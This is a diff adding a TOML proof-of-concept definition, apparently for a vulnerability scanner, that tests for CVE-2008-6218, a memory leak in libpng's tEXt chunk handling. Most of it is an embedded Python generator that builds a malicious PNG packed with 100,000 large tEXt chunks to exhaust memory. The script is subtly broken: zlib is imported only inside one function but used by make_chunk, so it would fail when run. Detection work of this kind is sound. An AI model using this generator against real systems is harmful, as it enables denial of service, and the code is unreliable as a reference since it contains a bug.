@@ -1,0 +1,48 @@
+[info]
+id = "POC-AVE-2008-0022"
+name = "libpng png_handle_tEXt 内存泄漏检测 PoC"
+author = "AVE"
+severity = "medium"
+tags = ["dos", "memory-leak", "libpng"]
+description = "通过构造包含大量 tEXt 块的恶意 PNG 文件，触发 libpng 的 png_handle_tEXt 函数内存泄漏，检测目标系统是否存在 CVE-2008-6218 漏洞。"
+vuln_id = ["CVE-2008-6218", "AVE-2008-0022"]
+
+[poc]
+type = "file"
+logic = "all"
+
+[poc.file]
+# 生成恶意 PNG 的 Python 脚本
+generator = "python3"
+description = "生成包含大量 tEXt 块的恶意 PNG 文件以触发内存泄漏"
+script = """
+import struct
+import sys
+
+def make_chunk(chunk_type, data):
+    chunk = chunk_type + data
+    crc = struct.pack('>I', zlib.crc32(chunk) & 0xffffffff)
+    return struct.pack('>I', len(data)) + chunk + crc
+
+def generate_malicious_png(filename="cve-2008-6218-poc.png", num_chunks=100000):
+    import zlib
+    # PNG signature
+    png_sig = b'\\x89PNG\\r\\n\\x1a\\n'
+    # IHDR chunk
+    ihdr_data = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
+    ihdr = make_chunk(b'IHDR', ihdr_data)
+    # Generate many tEXt chunks to exhaust memory
+    text_data = b'X' * 4096
+    chunks = b''
+    for i in range(num_chunks):
+        chunks += make_chunk(b'tEXt', b'Keyword' + text_data)
+    # IEND chunk
+    iend = make_chunk(b'IEND', b'')
+    with open(filename, 'wb') as f:
+        f.write(png_sig + ihdr + chunks + iend)
+    print(f'[*] Generated {filename} with {num_chunks} tEXt chunks')
+
+if __name__ == '__main__':
+    num = int(sys.argv[1]) if len(sys.argv) > 1 else 100000
+    generate_malicious_png(num_chunks=num)
+"""
